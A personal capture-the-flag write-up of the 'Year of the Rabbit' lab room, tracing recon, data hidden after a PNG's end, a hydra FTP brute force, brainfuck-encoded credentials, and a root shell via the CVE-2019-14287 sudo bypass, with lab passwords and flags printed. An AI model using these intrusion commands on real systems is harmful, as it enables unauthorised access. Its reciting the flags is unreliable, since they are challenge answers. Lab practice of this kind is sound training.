# Year of the Rabbit

Another CTF-like room...but one that was not too hard and impressive in its very longevity. Solved it almost entirely without help, except for near the end where I had to get a hint on the step after getting ssh access: I got distracted with a meaningless file, and didn't know about locate. Other than that, did well! Particularly proud about recognising a programming language (eventually) and recognising a prior CVE I'd used elsewhere.

1. Recon revealed 21, 22 and 80, all running standard services. FTP didn't support anonymous login.

2. Port 80 revealed the apache default page. Nothing was interesting in its source. A dirb revealed a listable `/assets` folder that contained a css file and a mp4 (the rickroll video)

3. I checked out the css file and found 

    ```
    /* Nice to see someone checking the stylesheets.
     Take a look at the page: /sup3r_s3cr3t_fl4g.php
    */
    ```

4. Navigating to that address I got a warning about turning off javascript, then got redirected to the youtube video of rickrolling.

5. I used curl to grab the page content, which was empty. So I used -I to find it redirected to `intermediary.php?hidden_directory=/WExYY2Cv-qU`. I carried on with curl on this to get a redirect to `/sup3r_s3cret_fl4g`, which hosted the rick roll code.

6. Even without javascript, the page says `This is happening whether you like it or not... The hint is in the video.`. I watched my way through the linked .mp4 file, which is a customised copy of the rick roll of internet fame. Half way through it says "I'll put you out of your misery...you are looking in the wrong place" with a digitised voice.

7. Looking back, the intermediary address had a query string `hidden_directory=/WExYY2Cv-qU`. Going to that directory on the server revealed a listable location containing a single image, `Hot_Babe.png` with an image of a (unfortunately but probably for the best) clothed woman looking over her shoulder. I downloaded this to my attacker machine.

8. `binwalk` revealed it contained a zlib file. `binwalk -e Hot_Babe.png` pulled this out into `36.zlib` and helpfully extracted it as `36`. `binwalk` on `36` revealed it as a bunch of `MySQL MISAM index file` entries, which is a false positive from binwalk when it can't decode something. Hmm...

9. Further investigation revealed I was possibly chasing something incorrect. The image was 500kb, roughly, and the 'zlib compressed file' start 36 bytes into it. Too short for the thing to also be a valid image, which it was. Maybe this is just how pngs appear?

10. `pngcheck` complained of content after IEND. Specifically `pngcheck -v Hot_Babe.png` revealed:

    ```
    File: Hot_Babe.png (475075 bytes)
    chunk IHDR at offset 0x0000c, length 13
        512 x 512 image, 24-bit RGB, non-interlaced
    chunk sRGB at offset 0x00025, length 1
        rendering intent = perceptual
    chunk IDAT at offset 0x00032, length 473761
        zlib: deflated, 32K window, maximum compression
    chunk IEND at offset 0x73adf, length 0
    additional data after IEND chunk
    ERRORS DETECTED in Hot_Babe.png
    ```

11. I ran  `cat Hot_Babe.png | tail -c +$((16#73adf))` (note the parameter expansion to convert a hex value to decimal as required by `tail`) to get:

    ```
    IEND�B`�Ot9RrG7h2~24?
    Eh, you've earned this. Username for FTP is ftpuser
    One of these is the password:
    Mou+56n%QK8sr
    1618B0AUshw1M
    A56IpIl%1s02u
    vTFbDzX9&Nmu?
    FfF~sfu^UQZmT
    8FF?iKO27b~V0
    ua4W~2-@y7dE$
    3j39aMQQ7xFXT
    Wb4--CTc4ww*-
    u6oY9?nHv84D&
    0iBp4W69Gr_Yf
    TS*%miyPsGV54
    C77O3FIy0c0sd
    O14xEhgg0Hxz1
    5dpv#Pr$wqH7F
    1G8Ucoce1+gS5
    0plnI%f0~Jw71
    0kLoLzfhqq8u&
    kS9pn5yiFGj6d
    zeff4#!b5Ib_n
    rNT4E4SHDGBkl
    KKH5zy23+S0@B
    3r6PHtM4NzJjE
    gm0!!EC1A0I2?
    HPHr!j00RaDEi
    7N+J9BYSp4uaY
    PYKt-ebvtmWoC
    3TN%cD_E6zm*s
    eo?@c!ly3&=0Z
    nR8&FXz$ZPelN
    eE4Mu53UkKHx#
    86?004F9!o49d
    SNGY0JjA5@0EE
    trm64++JZ7R6E
    3zJuGL~8KmiK^
    CR-ItthsH%9du
    yP9kft386bB8G
    A-*eE3L@!4W5o
    GoM^$82l&GA5D
    1t$4$g$I+V_BH
    0XxpTd90Vt8OL
    j0CN?Z#8Bp69_
    G#h~9@5E5QA5l
    DRWNM7auXF7@j
    Fw!if_=kk7Oqz
    92d5r$uyw!vaE
    c-AA7a2u!W2*?
    zy8z3kBi#2e36
    J5%2Hn+7I6QLt
    gL$2fmgnq8vI*
    Etb?i?Kj4R=QM
    7CabD7kwY7=ri
    4uaIRX~-cY6K4
    kY1oxscv4EB2d
    k32?3^x1ex7#o
    ep4IPQ_=ku@V8
    tQxFJ909rd1y2
    5L6kpPR5E2Msn
    65NX66Wv~oFP2
    LRAQ@zcBphn!1
    V4bt3*58Z32Xe
    ki^t!+uqB?DyI
    5iez1wGXKfPKQ
    nJ90XzX&AnF5v
    7EiMd5!r%=18c
    wYyx6Eq-T^9#@
    yT2o$2exo~UdW
    ZuI-8!JyI6iRS
    PTKM6RsLWZ1&^
    3O$oC~%XUlRO@
    KW3fjzWpUGHSW
    nTzl5f=9eS&*W
    WS9x0ZF=x1%8z
    Sr4*E4NT5fOhS
    hLR3xQV*gHYuC
    4P3QgF5kflszS
    NIZ2D%d58*v@R
    0rJ7p%6Axm05K
    94rU30Zx45z5c
    Vi^Qf+u%0*q_S
    1Fvdp&bNl3#&l
    zLH%Ot0Bw&c%9
    ```

12. I took the password list and stuck it in a file `passes.txt`. Then with hydra:

    `hydra -l ftpuser -P passes.txt ftp://10.10.1.75`

    I got the password `5iez1wGXKfPKQ`

13. Connecting to ftp I found a file called `Eli's_Creds.txt`. Downloading that and reading it I found the following content:

    ```
    +++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
    --<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
    ++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
    +++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
    ]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
    ++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
    --<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
    +<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
    ++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
    <]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
    <]>+. <+++[ ->--- <]>-- ---.- ----. <
    ```

    God dammit - truly a rabbit hole, this room.

14. I *know* I've seen the above before, but I spent a lot of time looking for ciphers that matched. Eventually I remembered: its the programming language [brainfuck](https://en.wikipedia.org/wiki/Brainfuck)! I ran the above through an [online brainfuck interpreter](https://www.tutorialspoint.com/execute_brainfk_online.php), and got:

    ```
    User: eli
    Password: DSpDiM1wAEwid
    ```

15. I was able to ssh on to the machine using the above, and was greeted with the message:

    ```
    1 new message
    Message from Root to Gwendoline:

    "Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

    END MESSAGE
    ```

16. No `sudo -l`, nothing interesting in find -perm. Another home dir for `gwendoline` containing `user.txt`, but I couldn't read it. However, in eli's folder, there is a file called `core` that looked quite interesting: strings revealed it contained css, html, lots of reference to gtk etc. Maybe some sort of X server I could mount?

    > I spent a lot of time (like, several hours) messing about with `core`. But it was a red herring. I wasn't getting anywhere and so finally went for a hint.

17. Ignoring `core`, the next step was actually something I had idly considered on first joining: in the message about, "s3cr3t: is an odd out-of-place spelling. `locate s3cr3t` revealed:

    ```
    /usr/games/s3cr3t
    /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
    /var/www/html/sup3r_s3cr3t_fl4g.php
    ```

18. Catting `/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!` revealed:

    ```
    Your password is awful, Gwendoline.
    It should be at least 60 characters long! Not just MniVCQVhQHUNI
    Honestly!

    Yours sincerely
    -Root
    ```

19. I ssh'd on with gwendoline using these creds and read the user flag: `THM{1107174691af9ff3681d2b5bdb5740b1589bae53}`

20. `sudo -l` revealed:

    ```
    Matching Defaults entries for gwendoline on year-of-the-rabbit:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

    User gwendoline may run the following commands on year-of-the-rabbit:
        (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
    ```

    This looks suspiciously like `CVE-2019-14287`, which I dealt with in the room "agentsudoctf".

21. Sure enough, `sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt` opened vim, and then `:! /bin/sh` got me a root shell.

22. The final flag, at `/root/root.txt`, was `THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}`. Finally!

Overall, a very long and tough (but not too tough!) room. Glad its over, but had fun along the way.
